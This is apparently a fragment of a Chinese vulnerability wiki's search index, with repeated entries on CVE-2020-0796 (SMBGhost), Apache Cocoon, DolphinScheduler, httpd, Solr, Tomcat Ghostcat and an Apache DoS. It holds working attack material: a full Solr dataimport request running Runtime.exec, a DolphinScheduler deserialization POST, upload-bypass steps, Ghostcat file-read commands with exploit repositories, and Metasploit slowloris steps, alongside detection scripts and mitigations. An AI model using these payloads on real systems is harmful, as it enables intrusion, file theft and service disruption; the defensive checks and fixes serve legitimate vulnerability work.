\\x00\\x00\\x00\\xc0\\xfe SMB@ \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 $ \\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 x \\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x02\\x10\\x02 \" \\x02 $ \\x02\\x00\\x03\\x02\\x03\\x10\\x03\\x11\\x03\\x00\\x00\\x00\\x00\\x01\\x00 & \\x00\\x00\\x00\\x00\\x00\\x01\\x00 \\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\n\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ' sock = socket . socket ( socket . AF_INET ) sock . settimeout ( 3 ) sock . connect (( sys . argv [ 1 ], 445 )) sock . send ( pkt ) nb , = struct . unpack ( \">I\" , sock . recv ( 4 )) res = sock . recv ( nb ) if not res [ 68 : 70 ] == b \" \\x11\\x03 \" : exit ( \"Not vulnerable.\" ) if not res [ 70 : 72 ] == b \" \\x02\\x00 \" : exit ( \"Not vulnerable.\" ) exit ( \"Vulnerable.\" ) nmap\u7248\u672c\uff1a #!/bin/bash if [ $# -eq 0 ] then echo $'Usage:\\n\\tcheck-smb-v3.11.sh TARGET_IP_or_CIDR {Target Specification - Nmap}' exit 1 fi echo \"Checking if there's SMB v3.11 in\" $1 \"...\" nmap -p445 --script smb-protocols -Pn -n $1 | grep -P '\\d+\\.\\d+\\.\\d+\\.\\d+|^\\|.\\s+3.11' | tr '\\n' ' ' | tr 'Nmap scan report for' '@' | tr \"@\" \"\\n\" | tr '|' ' ' | tr '_' ' ' | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' if [[ $? ! = 0 ]] ; then echo \"There's no SMB v3.11\" fi \u6f0f\u6d1e\u7f13\u89e3\u65b9\u6cd5 \u6ce8:\u5728powershell\u4e0b\u7981\u6b62\u6216\u8005\u5f00\u542f\u5373\u53ef\u7f13\u89e3 Disable compression: Set-ItemProperty -Path \u201cHKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\u201d DisableCompression -Type DWORD -Value 1 -Force Enable compression: Set-ItemProperty -Path \u201cHKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\u201d DisableCompression -Type DWORD -Value 0 -Force","title":"CVE-2020\u20130796\u68c0\u6d4b\u4e0e\u4fee\u590d"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11991%EF%BC%89/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 Apache Cocoon <= 2.1.12 \u6f0f\u6d1ePOC \u00b6 \u6784\u9020\u5185\u5bb9\u5982\u4e0b\uff0c\u5411/v2/api/product/manger/getInfo\u4f4d\u7f6e POST\u5982\u4e0b\u5185\u5bb9\u5373\u53ef","title":"Apache Cocoon XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2020-11991\uff09"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11991%EF%BC%89/#_1","text":"Apache Cocoon <= 2.1.12","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11991%EF%BC%89/#poc","text":"\u6784\u9020\u5185\u5bb9\u5982\u4e0b\uff0c\u5411/v2/api/product/manger/getInfo\u4f4d\u7f6e POST\u5982\u4e0b\u5185\u5bb9\u5373\u53ef","title":"\u6f0f\u6d1ePOC"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u53d1\u5e03\u5b89\u5168\u516c\u544a\uff0c\u4fee\u590d\u4e86Apache DolphinScheduler\u6743\u9650\u8986\u76d6\u6f0f\u6d1e\uff08CVE-2020-13922\uff09\u4e0eApache DolphinScheduler\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff08CVE-2020-11974\uff09\u3002 CVE-2020-11974\u4e0emysql connectorj\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\u6709\u5173\uff0c\u5728\u9009\u62e9mysql\u4f5c\u4e3a\u6570\u636e\u5e93\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u901a\u8fc7jdbc connect\u53c2\u6570\u8f93\u5165{\u201cdetectCustomCollations\u201d:true\uff0c\u201c autoDeserialize\u201d:true} \u5728DolphinScheduler \u670d\u52a1\u5668\u4e0a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u3002 CVE-2020-13922\u5bfc\u81f4\u666e\u901a\u7528\u6237\u53ef\u901a\u8fc7api interface\u5728DolphinScheduler \u7cfb\u7edf\u4e2d\u8986\u76d6\u5176\u4ed6\u7528\u6237\u7684\u5bc6\u7801\uff1aapi interface /dolphinscheduler/users/update\uff0c\u8bf7\u76f8\u5173\u7528\u6237\u53ca\u65f6\u5347\u7ea7\u8fdb\u884c\u9632\u62a4\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 Apache DolphinScheduler\u6743\u9650\u8986\u76d6\u6f0f\u6d1e\uff08CVE-2020-13922\uff09 \u53d7\u5f71\u54cd\u7248\u672c \u00b6 Apache DolphinScheduler = 1.2.0\u30011.2.1\u30011.3.1 \u4e0d\u53d7\u5f71\u54cd\u7248\u672c \u00b6 Apache DolphinScheduler >= 1.3.2 Apache DolphinScheduler\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff08CVE-2020-11974\uff09 \u5b83\u662f\u2f00\u4e2a\u5206\u5e03\u5f0f\u53bb\u4e2d\u2f3c\u5316\uff0c\u6613\u6269\u5c55\u7684\u53ef\u89c6\u5316DAG(\u6709\u5411\u2f46\u73af\u56fe)\u2f2f\u4f5c\u6d41\u4efb\u52a1\u8c03\u5ea6\u7cfb\u7edf\u3002\u5229\u2f64\u6f0f\u6d1e:\u9700\u8981\u767b\u5f55\u6743\u9650, [09/12 \u6001\u52bf\u611f\u77e5]\u63d0\u4f9b\u2f00\u7ec4\u9ed8\u8ba4\u5bc6\u7801\u3002 \u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8e\u6570\u636e\u6e90\u4e2d\u2f3c\u672a\u9650\u5236\u6dfb\u52a0\u7684jdbc\u8fde\u63a5\u53c2\u6570,\u4ece\u2f7d\u5b9e\u73b0JDBC\u5ba2\u6237\u7aef\u53cd\u5e8f\u5217\u5316\u3002 1\u3001\u767b\u5f55\u5230\u2faf\u677f -> \u6570\u636e\u6e90\u4e2d\u2f3c\u3002 2\u3001jdbc\u8fde\u63a5\u53c2\u6570\u5c31\u662f\u4e3b\u2ec6,\u8fd9\u2fa5\u6ca1\u6709\u9650\u5236\u4efb\u610f\u7c7b\u578b\u7684\u8fde\u63a5\u4e32\u53c2\u6570\u3002 3\u3001\u5c06\u4ee5\u4e0b\u6570\u636e\u6dfb\u52a0\u5230jdbc\u8fde\u63a5\u53c2\u6570\u4e2d,\u5c31\u53ef\u4ee5\u76f4\u63a5\u89e6\u53d1\u3002 POST /dolphinscheduler/datasources/connect HTTP/1.1 type=MYSQL&name=test\u00ace=&host=127.0.0.1&port=3306&database=test& principal=&userName=root&password=root&connectType=& other={\"detectCustomCollations\":true,\"autoDeserialize\":true} #### \u53d7\u5f71\u54cd\u7248\u672c Apache DolphinScheduler = 1.2.0\u30011.2.1 #### \u4e0d\u53d7\u5f71\u54cd\u7248\u672c Apache DolphinScheduler >= 1.3.1 #### \u4fee\u590d\u5efa\u8bae \u5b98\u65b9\u5347\u7ea7 \u76ee\u524d\u5b98\u65b9\u5df2\u5728\u6700\u65b0\u7248\u672c\u4e2d\u4fee\u590d\u4e86\u6b64\u6b21\u7684\u6f0f\u6d1e\uff0c\u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u7248\u672c\u81f31.3.2\u8fdb\u884c\u9632\u62a4\u3002 \u5b98\u65b9\u4e0b\u8f7d\u94fe\u63a5\uff1a https://dolphinscheduler.apache.org/zhcn/docs/release/download.html","title":"Apache DolphinScheduler\u9ad8\u5371\u6f0f\u6d1e\uff08CVE-2020-11974\u3001CVE-2020-13922\uff09"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_1","text":"Apache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u53d1\u5e03\u5b89\u5168\u516c\u544a\uff0c\u4fee\u590d\u4e86Apache DolphinScheduler\u6743\u9650\u8986\u76d6\u6f0f\u6d1e\uff08CVE-2020-13922\uff09\u4e0eApache DolphinScheduler\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff08CVE-2020-11974\uff09\u3002 CVE-2020-11974\u4e0emysql connectorj\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\u6709\u5173\uff0c\u5728\u9009\u62e9mysql\u4f5c\u4e3a\u6570\u636e\u5e93\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u901a\u8fc7jdbc connect\u53c2\u6570\u8f93\u5165{\u201cdetectCustomCollations\u201d:true\uff0c\u201c autoDeserialize\u201d:true} \u5728DolphinScheduler \u670d\u52a1\u5668\u4e0a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u3002 CVE-2020-13922\u5bfc\u81f4\u666e\u901a\u7528\u6237\u53ef\u901a\u8fc7api interface\u5728DolphinScheduler \u7cfb\u7edf\u4e2d\u8986\u76d6\u5176\u4ed6\u7528\u6237\u7684\u5bc6\u7801\uff1aapi interface /dolphinscheduler/users/update\uff0c\u8bf7\u76f8\u5173\u7528\u6237\u53ca\u65f6\u5347\u7ea7\u8fdb\u884c\u9632\u62a4\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_2","text":"Apache DolphinScheduler\u6743\u9650\u8986\u76d6\u6f0f\u6d1e\uff08CVE-2020-13922\uff09","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_3","text":"Apache DolphinScheduler = 1.2.0\u30011.2.1\u30011.3.1","title":"\u53d7\u5f71\u54cd\u7248\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_4","text":"Apache DolphinScheduler >= 1.3.2 Apache DolphinScheduler\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff08CVE-2020-11974\uff09 \u5b83\u662f\u2f00\u4e2a\u5206\u5e03\u5f0f\u53bb\u4e2d\u2f3c\u5316\uff0c\u6613\u6269\u5c55\u7684\u53ef\u89c6\u5316DAG(\u6709\u5411\u2f46\u73af\u56fe)\u2f2f\u4f5c\u6d41\u4efb\u52a1\u8c03\u5ea6\u7cfb\u7edf\u3002\u5229\u2f64\u6f0f\u6d1e:\u9700\u8981\u767b\u5f55\u6743\u9650, [09/12 \u6001\u52bf\u611f\u77e5]\u63d0\u4f9b\u2f00\u7ec4\u9ed8\u8ba4\u5bc6\u7801\u3002 \u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8e\u6570\u636e\u6e90\u4e2d\u2f3c\u672a\u9650\u5236\u6dfb\u52a0\u7684jdbc\u8fde\u63a5\u53c2\u6570,\u4ece\u2f7d\u5b9e\u73b0JDBC\u5ba2\u6237\u7aef\u53cd\u5e8f\u5217\u5316\u3002 1\u3001\u767b\u5f55\u5230\u2faf\u677f -> \u6570\u636e\u6e90\u4e2d\u2f3c\u3002 2\u3001jdbc\u8fde\u63a5\u53c2\u6570\u5c31\u662f\u4e3b\u2ec6,\u8fd9\u2fa5\u6ca1\u6709\u9650\u5236\u4efb\u610f\u7c7b\u578b\u7684\u8fde\u63a5\u4e32\u53c2\u6570\u3002 3\u3001\u5c06\u4ee5\u4e0b\u6570\u636e\u6dfb\u52a0\u5230jdbc\u8fde\u63a5\u53c2\u6570\u4e2d,\u5c31\u53ef\u4ee5\u76f4\u63a5\u89e6\u53d1\u3002 POST /dolphinscheduler/datasources/connect HTTP/1.1 type=MYSQL&name=test\u00ace=&host=127.0.0.1&port=3306&database=test& principal=&userName=root&password=root&connectType=& other={\"detectCustomCollations\":true,\"autoDeserialize\":true} #### \u53d7\u5f71\u54cd\u7248\u672c Apache DolphinScheduler = 1.2.0\u30011.2.1 #### \u4e0d\u53d7\u5f71\u54cd\u7248\u672c Apache DolphinScheduler >= 1.3.1 #### \u4fee\u590d\u5efa\u8bae \u5b98\u65b9\u5347\u7ea7 \u76ee\u524d\u5b98\u65b9\u5df2\u5728\u6700\u65b0\u7248\u672c\u4e2d\u4fee\u590d\u4e86\u6b64\u6b21\u7684\u6f0f\u6d1e\uff0c\u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u7248\u672c\u81f31.3.2\u8fdb\u884c\u9632\u62a4\u3002 \u5b98\u65b9\u4e0b\u8f7d\u94fe\u63a5\uff1a https://dolphinscheduler.apache.org/zhcn/docs/release/download.html","title":"\u4e0d\u53d7\u5f71\u54cd\u7248\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Httpd%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 Apache httpd2.4.0~2.4.29 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 1.a.php\u6587\u4ef6 \u5185\u5bb9\uff1a <?php phpinfo(); ?> 2.\u4e0a\u4f20a.php\u5e76\u6293\u5305 3.\u4fee\u6539a.php HEX\u7684\u540e\u9762\u52a0\u4e0a0a\u540e\u653e\u5305 4.\u6587\u4ef6\u4e0a\u4f20\u6210\u529f 5.\u8bbf\u95eea.php,\u540e\u7f00\u52a0\u4e0a%0A","title":"Apache Httpd\u6362\u884c\u89e3\u6790\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Httpd%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_1","text":"Apache httpd2.4.0~2.4.29","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Httpd%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_2","text":"1.a.php\u6587\u4ef6 \u5185\u5bb9\uff1a <?php phpinfo(); ?> 2.\u4e0a\u4f20a.php\u5e76\u6293\u5305 3.\u4fee\u6539a.php HEX\u7684\u540e\u9762\u52a0\u4e0a0a\u540e\u653e\u5305 4.\u6587\u4ef6\u4e0a\u4f20\u6210\u529f 5.\u8bbf\u95eea.php,\u540e\u7f00\u52a0\u4e0a%0A","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2019-0193/","text":"\u5f71\u54cd\u7248\u672c apache solr 5.x-8.2.0,\u5b58\u5728config API\u7248\u672c \u83b7\u53d6\u6240\u6709 core \u4fe1\u606f\uff1acurl http://IP/solr/admin/cores HTTP\u534f\u8bae\u5934\uff1aPOST /solr//dataimport POC POST /solr/<your_core_name>/dataimport HTTP/1.1 Host: 127.0.0.1:8983 Content-Length: 763 User-Agent: Mozilla/5.0 Content-type: application/x-www-form-urlencoded Connection: close command=full-import&verbose=false&clean=false&commit=true&debug=true&core=<your_core_name>&name=dataimport&dataConfig= <dataConfig> <dataSource type=\"URLDataSource\"></dataSource> <script><![CDATA[ function poc(row){ var process= java.lang.Runtime.getRuntime(); process.exec(\"calc\"); return row; } ]]></script> <document> <entity name=\"stackoverflow\" url=\"https://stackoverflow.com/feeds/tag/solr\" processor=\"XPathEntityProcessor\" forEach=\"/feed\" transformer=\"script:poc\" ></entity> </document> </dataConfig>","title":"Apache Solr\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2019-0193"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31 \u6f0f\u6d1e\u7b80\u4ecb \u00b6 Apache Tomcat\u670d\u52a1\u5668\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u6216\u5305\u542b Tomcat \u4e0a\u6240\u6709 webapp \u76ee\u5f55\u4e0b\u7684\u4efb\u610f\u6587\u4ef6\uff0c\u5982\uff1awebapp \u914d\u7f6e\u6587\u4ef6\u6216\u6e90\u4ee3\u7801\u7b49\u3002 \u7531\u4e8eTomcat\u9ed8\u8ba4\u5f00\u542f\u7684AJP\u670d\u52a1\uff088009\u7aef\u53e3\uff09\u5b58\u5728\u4e00\u5904\u6587\u4ef6\u5305\u542b\u7f3a\u9677\uff0c\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u7684\u8bf7\u6c42\u5305\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u64cd\u4f5c\uff0c\u8fdb\u800c\u8bfb\u53d6\u53d7\u5f71\u54cdTomcat\u670d\u52a1\u5668\u4e0a\u7684Web\u76ee\u5f55\u6587\u4ef6\u3002 \u590d\u73b0\u5229\u7528 \u00b6 \u642d\u5efa\u73af\u5883 \u514b\u9686\u5b9e\u9a8c\u73af\u5883 git clone https://github.com/laolisafe/CVE-2020-1938 \u89e3\u538bApache unzip apache-tomcat-8.5.32.zip \u5728Apache\u7684bin\u76ee\u5f55\u4e0b\uff0c\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff0c\u6211\u8fd9\u91cc\u7ed9\u5168\u90e8\u6743\u9650 chmod -R +x bin/ \u542f\u52a8apache sh startup.sh \u67e5\u770b\u7aef\u53e3\uff0c8009\u7aef\u53e3\u662f\u5f00\u542f\u7684 \u5229\u7528\u6f0f\u6d1e poc\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi \u6ce8\u610fpoc\u4e3apy2\u73af\u5883 python ./ CNVD-2020-10487-Tomcat-Ajp-lfi.py \u672c\u5730ip \u2013p 8009 \u2013f WEB-INF/web.xml \u6f0f\u6d1e\u4fee\u590d\u5efa\u8bae \u00b6 1.\u4e34\u65f6\u7981\u7528AJP\u534f\u8bae\u7aef\u53e3\uff0c\u5728conf/server.xml\u914d\u7f6e\u6587\u4ef6\u4e2d\u6ce8\u91ca\u6389 2\u3001\u914d\u7f6eajp\u914d\u7f6e\u4e2d\u7684secretRequired\u8ddfsecret\u5c5e\u6027\u6765\u9650\u5236\u8ba4\u8bc1 3\u3001\u5b98\u65b9\u4e0b\u8f7d\u6700\u65b0\u7248\u4e0b\u8f7d\u5730\u5740\uff1a https://tomcat.apache.org/download-70.cgi https://tomcat.apache.org/download-80.cgi https://tomcat.apache.org/download-90.cgi","title":"Apache-Tomcat-Ajp\u6587\u4ef6\u5305\u542bCVE-2020-1938"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_1","text":"Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_2","text":"Apache Tomcat\u670d\u52a1\u5668\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u6216\u5305\u542b Tomcat \u4e0a\u6240\u6709 webapp \u76ee\u5f55\u4e0b\u7684\u4efb\u610f\u6587\u4ef6\uff0c\u5982\uff1awebapp \u914d\u7f6e\u6587\u4ef6\u6216\u6e90\u4ee3\u7801\u7b49\u3002 \u7531\u4e8eTomcat\u9ed8\u8ba4\u5f00\u542f\u7684AJP\u670d\u52a1\uff088009\u7aef\u53e3\uff09\u5b58\u5728\u4e00\u5904\u6587\u4ef6\u5305\u542b\u7f3a\u9677\uff0c\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u7684\u8bf7\u6c42\u5305\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u64cd\u4f5c\uff0c\u8fdb\u800c\u8bfb\u53d6\u53d7\u5f71\u54cdTomcat\u670d\u52a1\u5668\u4e0a\u7684Web\u76ee\u5f55\u6587\u4ef6\u3002","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_3","text":"\u642d\u5efa\u73af\u5883 \u514b\u9686\u5b9e\u9a8c\u73af\u5883 git clone https://github.com/laolisafe/CVE-2020-1938 \u89e3\u538bApache unzip apache-tomcat-8.5.32.zip \u5728Apache\u7684bin\u76ee\u5f55\u4e0b\uff0c\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff0c\u6211\u8fd9\u91cc\u7ed9\u5168\u90e8\u6743\u9650 chmod -R +x bin/ \u542f\u52a8apache sh startup.sh \u67e5\u770b\u7aef\u53e3\uff0c8009\u7aef\u53e3\u662f\u5f00\u542f\u7684 \u5229\u7528\u6f0f\u6d1e poc\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi \u6ce8\u610fpoc\u4e3apy2\u73af\u5883 python ./ CNVD-2020-10487-Tomcat-Ajp-lfi.py \u672c\u5730ip \u2013p 8009 \u2013f WEB-INF/web.xml","title":"\u590d\u73b0\u5229\u7528"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_4","text":"1.\u4e34\u65f6\u7981\u7528AJP\u534f\u8bae\u7aef\u53e3\uff0c\u5728conf/server.xml\u914d\u7f6e\u6587\u4ef6\u4e2d\u6ce8\u91ca\u6389 2\u3001\u914d\u7f6eajp\u914d\u7f6e\u4e2d\u7684secretRequired\u8ddfsecret\u5c5e\u6027\u6765\u9650\u5236\u8ba4\u8bc1 3\u3001\u5b98\u65b9\u4e0b\u8f7d\u6700\u65b0\u7248\u4e0b\u8f7d\u5730\u5740\uff1a https://tomcat.apache.org/download-70.cgi https://tomcat.apache.org/download-80.cgi https://tomcat.apache.org/download-90.cgi","title":"\u6f0f\u6d1e\u4fee\u590d\u5efa\u8bae"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 Apache 1.x/2.x \u6f0f\u6d1e\u5229\u7528 \u00b6 nmap\u4f7f\u7528-sV\u626b\u63cf\u670d\u52a1\u5668\u83b7\u53d6\u670d\u52a1\u7248\u672c msf\u5229\u7528\u6b65\u9aa4\u5982\u4e0b``` 1.msfconsole(\u542f\u52a8metasploit) 2.use auxiliary/dos/http/slowloris(\u4f7f\u7528\u6a21\u5757) 3.set RHOST targetip(\u8bbe\u7f6e\u76ee\u6807IP) 4.run(\u6267\u884c\u653b\u51fb)","title":"Apache\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#_1","text":"Apache 1.x/2.x","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#_2","text":"nmap\u4f7f\u7528-sV\u626b\u63cf\u670d\u52a1\u5668\u83b7\u53d6\u670d\u52a1\u7248\u672c msf\u5229\u7528\u6b65\u9aa4\u5982\u4e0b``` 1.msfconsole(\u542f\u52a8metasploit) 2.use auxiliary/dos/http/slowloris(\u4f7f\u7528\u6a21\u5757) 3.set RHOST targetip(\u8bbe\u7f6e\u76ee\u6807IP) 4.run(\u6267\u884c\u653b\u51fb)","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","text":"CVE-2020-26945 mybatis\u4e8c\u7ea7\u7f13\u5b58\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 0x01 \u7b80\u4ecb \u00b6 MyBatis \u672c\u662fApache\u7684\u4e00\u4e2a\u5f00\u6e90\u9879\u76eeiBatis, 2010\u5e74\u8fd9\u4e2a\u9879\u76ee\u7531Apache Software Foundation 